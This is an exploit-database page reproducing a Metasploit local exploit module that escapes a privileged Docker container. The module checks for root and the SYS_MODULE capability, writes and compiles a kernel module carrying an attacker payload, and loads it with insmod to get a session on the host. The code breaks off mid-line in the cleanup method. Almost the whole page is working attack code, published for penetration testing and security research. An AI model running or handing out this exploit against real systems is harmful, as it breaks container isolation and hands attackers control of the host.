---
title: Docker Privileged Container Kernel Escape
url: https://cxsecurity.com/issue/WLB-2024050018
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-05-07
fetch_date: 2025-10-06T17:15:47.080705
---

# Docker Privileged Container Kernel Escape

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Docker Privileged Container Kernel Escape** **2024.05.06**  Credit:  **[Eran Ayalon](https://cxsecurity.com/author/Eran%2BAyalon/1/)**  Risk: **High**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Local
Rank = NormalRanking
prepend Msf::Exploit::Remote::AutoCheck
include Msf::Post::File
include Msf::Post::Unix
include Msf::Post::Linux::System
include Msf::Post::Linux::Kernel
include Msf::Exploit::FileDropper
def initialize(info = {})
super(
update\_info(
info,
{
'Name' => 'Docker Privileged Container Kernel Escape',
'Description' => %q{
This module performs a container escape onto the host as the daemon
user. It takes advantage of the SYS\_MODULE capability. If that
exists and the linux headers are available to compile on the target,
then we can escape onto the host.
},
'License' => MSF\_LICENSE,
'Author' => [
'Nick Cottrell <Rad10Logic>', # Module writer
'Eran Ayalon', # PoC/article writer
'Ilan Sokol' # PoC/article writer
],
'Platform' => %w[linux unix],
'Arch' => [ARCH\_CMD],
'Targets' => [['Automatic', {}]],
'DefaultOptions' => { 'PrependFork' => true, 'WfsDelay' => 20 },
'SessionTypes' => %w[shell meterpreter],
'DefaultTarget' => 0,
'References' => [
%w[URL https://www.cybereason.com/blog/container-escape-all-you-need-is-cap-capabilities],
%w[URL https://github.com/maK-/reverse-shell-access-kernel-module]
],
'DisclosureDate' => '2014-05-01', # Went in date of commits in github URL
'Notes' => {
'Stability' => [ CRASH\_SAFE ],
'Reliability' => [ REPEATABLE\_SESSION ],
'SideEffects' => [ ARTIFACTS\_ON\_DISK, IOC\_IN\_LOGS ]
}
}
)
)
register\_advanced\_options([
OptString.new('KernelModuleName', [true, 'The name that the kernel module will be called in the system', rand\_text\_alpha(8)], regex: /^[\w-]+$/),
OptString.new('WritableContainerDir', [true, 'A directory where we can write files in the container', "/tmp/.#{rand\_text\_alpha(4)}"])
])
end
# Check we have all the prerequisites to perform the escape
def check
# Checking database if host has already been disclosed as a container
container\_name =
if active\_db? && framework.db.workspace.hosts.where(address: session.session\_host)&.first&.virtual\_host
framework.db.workspace.hosts.where(address: session.session\_host)&.first&.virtual\_host
else
get\_container\_type
end
unless %w[docker podman lxc].include?(container\_name.downcase)
return Exploit::CheckCode::Safe('Host does not appear to be container of any kind')
end
# is root user
unless is\_root?
return Exploit::CheckCode::Safe('Exploit requires root inside container')
end
# Checking if the SYS\_MODULE capability is enabled
capability\_bitmask = read\_file('/proc/1/status')[/^CapEff:\s+[0-9a-f]{16}$/][/[0-9a-f]{16}$/].to\_i(16)
unless capability\_bitmask & 0x0000000000010000 > 0
return Exploit::CheckCode::Safe('SYS\_MODULE Capability does not appear to be enabled')
end
CheckCode::Vulnerable('Inside Docker container and target appears vulnerable.')
end
def exploit
krelease = kernel\_release
# Check if kernel header folders exist
kernel\_headers\_path = [
"/lib/modules/#{krelease}/build",
"/usr/src/kernels/#{krelease}"
].find { |path| directory?(path) }
unless kernel\_headers\_path
fail\_with(Failure::NoTarget, 'Kernel headers for this target do not appear to be installed.')
end
vprint\_status("Kernel headers found at: #{kernel\_headers\_path}")
# Check that our required binaries are installed
unless command\_exists?('insmod')
fail\_with(Failure::NoTarget, 'insmod does not appear to be installed.')
end
unless command\_exists?('make')
fail\_with(Failure::NoTarget, 'make does not appear to be installed.')
end
# Check that container directory is writable
if directory?(datastore['WritableContainerDir']) && !writable?(datastore['WritableContainerDir'])
fail\_with(Failure::BadConfig, "#{datastore['WritableContainerDir']} is not writable")
end
# Checking that kernel module isn't already running
if kernel\_modules.include?(datastore['KernelModuleName'])
fail\_with(Failure::BadConfig, "#{datastore['KernelModuleName']} is already loaded into the kernel. You may need to remove it manually.")
end
# Creating source files
print\_status('Creating files...')
mkdir(datastore['WritableContainerDir']) unless directory?(datastore['WritableContainerDir'])
write\_kernel\_source(datastore['KernelModuleName'], payload.encoded)
write\_makefile(datastore['KernelModuleName'])
register\_files\_for\_cleanup([
"#{datastore['KernelModuleName']}.c",
'Makefile'
].map { |filename| File.join(datastore['WritableContainerDir'], filename) })
# Making exploit
print\_status('Compiling the kernel module...')
results = cmd\_exec("make -C '#{datastore['WritableContainerDir']}' KERNEL\_DIR='#{kernel\_headers\_path}' PWD='#{datastore['WritableContainerDir']}'")
vprint\_status('Make results')
vprint\_line(results)
register\_files\_for\_cleanup([
'Module.symvers',
'modules.order',
"#{datastore['KernelModuleName']}.mod",
"#{datastore['KernelModuleName']}.mod.c",
"#{datastore['KernelModuleName']}.mod.o",
"#{datastore['KernelModuleName']}.o"
].map { |filename| File.join(datastore['WritableContainerDir'], filename) })
# Checking if kernel file exists
unless file\_exist?("#{datastore['WritableContainerDir']}/#{datastore['KernelModuleName']}.ko")
fail\_with(Failure::PayloadFailed, 'Kernel module did not compile. Run with verbose to see make errors.')
end
print\_good('Kernel module compiled successfully')
# Loading module and running exploit
print\_status('Loading kernel module...')
results = cmd\_exec("insmod '#{datastore['WritableContainerDir']}/#{datastore['KernelModuleName']}.ko'")
unless results.blank?
results = results.strip
vprint\_status('Insmod results: ' + (results.count("\n") == 0 ? results : ''))
vprint\_line(results) if results.count("\n") > 0
end
end
def cleanup
# Attempt to remove kernel module
if kernel\_modules.include?(datastore['KernelModuleName'])
vprint\_status('Cleaning kernel module')
cmd\_exec("rmmod #{data...